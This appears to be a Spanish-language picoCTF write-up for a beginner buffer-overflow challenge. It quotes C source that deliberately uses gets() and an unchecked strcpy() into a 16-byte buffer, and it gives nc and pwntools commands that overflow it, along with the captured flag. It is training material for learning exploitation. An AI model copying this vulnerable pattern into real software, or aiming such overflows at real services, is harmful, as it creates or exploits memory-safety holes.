## Objetivo
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c).Connect using:`nc saturn.picoctf.net 55503`
## Solución
Vemos el código fuente del programa.
```bash
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
              
```

La variable buf2 copia mas de lo que puede, y el lector trata de guardar algo mas grande de lo que puede, por lo tanto se provoca un desborde.

```bash
┌──(kali㉿kali)-[~/picoCTF/binexp1/bufferoveflow]
└─$ nc saturn.picoctf.net 55503
Input: qwertyuiopasdfghjkzxcvbn
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}

```

```bash
┌──(kali㉿kali)-[~/picoCTF/binexp1/bufferoveflow]
└─$ nc saturn.picoctf.net 55503 <<< $(python3 -c "print('A'*20)")
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}

```

Exploit
```python
from pwn import *
#p = process()
p =remote('saturn.picoctf.net', 62369)
print(p.recv().decode())

overflow = b'A'*20

p.sendline(overflow)
print(p.recvall().decode())
p.close()

```
## Notas Adicionales

## Referencias
